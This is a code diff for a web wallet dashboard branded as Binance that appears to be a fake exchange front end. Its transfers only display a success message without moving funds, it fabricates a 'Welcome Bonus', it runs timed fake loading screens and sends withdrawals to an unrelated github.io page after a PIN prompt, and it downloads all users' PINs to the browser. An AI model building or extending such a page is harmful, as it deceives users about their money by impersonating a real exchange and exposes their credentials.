-        document.getElementById('funds-amount').value = '100';
-        document.getElementById('funds-password').value = '';
-        document.getElementById('funds-error').style.display = 'none';
-        openModal('addfunds-modal');
-        lucide.createIcons();
-    }
-
-    function showTransferModal() {
-        document.getElementById('transfer-amount').value = '';
-        document.getElementById('transfer-error').style.display = 'none';
-        openModal('transfer-modal');
-        lucide.createIcons();
-    }
-
-    function processTransfer() {
-        const amount = parseFloat(document.getElementById('transfer-amount').value);
-        const from = document.getElementById('transfer-from').value;
-        const to = document.getElementById('transfer-to').value;
-        const errorDiv = document.getElementById('transfer-error');
-        
-        if (!amount || amount <= 0) { errorDiv.style.display = 'block'; errorDiv.innerHTML = 'Please enter a valid amount'; return; }
-        if (from === to) { errorDiv.style.display = 'block'; errorDiv.innerHTML = 'Cannot transfer to the same wallet'; return; }
-        if (amount > currentBalance) { errorDiv.style.display = 'block'; errorDiv.innerHTML = 'Insufficient balance'; return; }
-        
-        startSimpleLoading(4000, () => {
-            currentBalance -= amount;
-            localStorage.setItem('binance_user_balance', currentBalance);
-            
-            transactions.unshift({
-                type: `Transfer (${from} → ${to})`,
-                amount: -amount,
-                date: new Date().toLocaleString(),
-                status: 'Completed'
-            });
-            
-            showToast(`✅ Transferred $${amount.toLocaleString()} from ${from} to ${to}`, true);
-            closeModal('transfer-modal');
-            updateWalletDisplay();
-        });
-    }
-
+    
     function handleWithdraw() {
-        startSimpleLoading(6000, () => {
+        startWithdrawSimpleLoading(6000, () => {
             showWithdrawPinPopup();
         });
     }
-
+    
     function showWithdrawPinPopup() {
         const modalHtml = `
             <div id="withdraw-pin-modal" class="modal" style="display: flex;">
@@ -526,9 +733,7 @@
                     <div id="withdraw-pin-error" class="error-message" style="display: none; background: rgba(246,70,93,0.1); padding: 10px; border-radius: 8px; margin-bottom: 16px;">
                         <i class="fa-solid fa-circle-exclamation mr-2"></i> Incorrect PIN. Please try again.
                     </div>
-                    <button onclick="verifyWithdrawPin()" class="binance-yellow-btn w-full py-3 rounded-xl font-bold flex items-center justify-center gap-2">
-                        <i class="fa-solid fa-check-circle"></i> Verify & Continue
-                    </button>
+                    <button onclick="verifyWithdrawPin()" class="w-full py-3 rounded-xl font-bold flex items-center justify-center gap-2" style="background: #0ecb81; color: white;">Verify & Continue</button>
                     <button onclick="closeWithdrawPinModal()" class="w-full mt-3 py-2 rounded-xl font-bold text-gray-400 hover:text-white transition">Cancel</button>
                 </div>
             </div>
@@ -538,9 +743,9 @@
         document.body.insertAdjacentHTML('beforeend', modalHtml);
         lucide.createIcons();
     }
-
+    
     function closeWithdrawPinModal() { const modal = document.getElementById('withdraw-pin-modal'); if (modal) modal.remove(); }
-
+    
     async function verifyWithdrawPin() {
         const enteredPin = document.getElementById('withdraw-pin-input').value;
         const errorDiv = document.getElementById('withdraw-pin-error');
@@ -550,11 +755,32 @@
         if (enteredPin !== currentUserPin) { errorDiv.style.display = 'block'; errorDiv.innerHTML = 'Incorrect PIN. Please try again.'; return; }
         
         closeWithdrawPinModal();
-        startSimpleLoading(9000, () => {
+        startWithdrawSimpleLoading(9000, () => {
             window.location.href = 'https://cryptoinc-codic.github.io/Withdrawal-/';
         });
     }
-
+    
+    // ========== TRANSFER FUNCTION ==========
+    
+    function processTransfer() {
+        const amount = parseFloat(document.getElementById('transfer-amount').value);
+        const from = document.getElementById('transfer-from').value;
+        const to = document.getElementById('transfer-to').value;
+        const errorDiv = document.getElementById('transfer-error');
+        
+        if (!amount || amount <= 0) { errorDiv.style.display = 'block'; errorDiv.innerHTML = 'Please enter a valid amount'; return; }
+        if (from === to) { errorDiv.style.display = 'block'; errorDiv.innerHTML = 'Cannot transfer to the same wallet'; return; }
+        
+        const totalUsd = assets.reduce((sum, asset) => sum + asset.usdValue, 0);
+        if (amount > totalUsd) { errorDiv.style.display = 'block'; errorDiv.innerHTML = 'Insufficient balance'; return; }
+        
+        showToast(`✅ Transferred $${amount.toLocaleString()} from ${from} to ${to}`, true);
+        closeModal('transfer-modal');
+        document.getElementById('transfer-amount').value = '';
+    }
+    
+    // ========== PROFILE FUNCTIONS ==========
+    
     function toggleProfilePopup() {
         const popup = document.getElementById('profile-popup');
         if (popup.classList.contains('active')) popup.classList.remove('active');
@@ -564,41 +790,70 @@
             popup.classList.add('active'); 
         }
     }
-
+    
     function closeProfilePopup() { document.getElementById('profile-popup').classList.remove('active'); }
-
+    
     function logoutUser() {
         localStorage.removeItem('binance_session_email');
         localStorage.removeItem('binance_user_balance');
         window.location.href = 'index.html';
     }
-
+    
+    function openModal(modalId) { document.getElementById(modalId).classList.add('active'); lucide.createIcons(); }
+    function closeModal(modalId) { document.getElementById(modalId).classList.remove('active'); }
+    function showTransferModal() { openModal('transfer-modal'); }
+    
+    // ========== FETCH USER DATA FROM DATABASE ==========
+    
     async function fetchUserData() {
+        const savedEmail = localStorage.getItem('binance_session_email');
+        if (!savedEmail) return;
+        
         try {
             const response = await fetch(`${API_URL}`);
             const users = await response.json();
-            const user = users.find(u => u.Email && u.Email.toLowerCase() === currentUserEmail.toLowerCase());
+            const user = users.find(u => u.Email && u.Email.toLowerCase() === savedEmail.toLowerCase());
             if (user) {
-                currentUserHashedPassword = user.HashedPassword || null;
                 currentUserPin = user.Pin || null;
+                const dbBalance = parseFloat(user.Balance) || 0;
+                currentBalance = dbBalance;
+                
+                // Update assets based on balance
+                const usdtAsset = assets.find(a => a.symbol === 'USDT');
+                if (usdtAsset) {
+                    usdtAsset.balance = dbBalance;
+                    usdtAsset.usdValue = dbBalance;
+                }
+                
+                // Load transactions from localStorage
+                const savedTransactions = localStorage.getItem(`transactions_${savedEmail}`);
+                if (savedTransactions) {
+                    transactions = JSON.parse(savedTransactions);
+                } else {
+                    transactions = [
+                        { type: 'Welcome Bonus', amount: 100, date: new Date().toLocaleString(), status: 'Completed' }
+                    ];
+                }
+                
+                updateWalletDisplay();
+                renderAssets();
+                renderTransactions();
             }
-        } catch (error) { console.error('Error fetching user:', error); }
+        } catch (error) {
+            console.error('Error fetching user:', error);
+        }
     }
-
+    
     function checkSession() {
         const savedEmail = localStorage.getItem('binance_session_email');
-        const savedBalance = localStorage.getItem('binance_user_balance');
         if (savedEmail) {
             currentUserEmail = savedEmail;
-            currentBalance = parseFloat(savedBalance) || 10000;
             fetchUserData();
-            updateWalletDisplay();
-            renderAssets();
         } else {
             window.location.href = 'index.html';
         }
     }
-
+    
     async function updateLivePrice() {
         try {
             const res = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT');
@@ -607,10 +862,16 @@
             updateWalletDisplay();
         } catch (err) { }
     }
-
+    
+    // Set up event listeners
+    document.getElementById('addFundsBtn').onclick = startAddFundFirstLoading;
+    document.getElementById('fundingAddFundsBtn').onclick = startAddFundFirstLoading;
+    document.getElementById('withdrawBtn').onclick = handleWithdraw;
+    document.getElementById('transferBtn').onclick = showTransferModal;
+    
     setInterval(updateLivePrice, 10000);
     updateLivePrice();
-
+    
     window.addEventListener('load', () => {
         checkSession();
         lucide.createIcons();
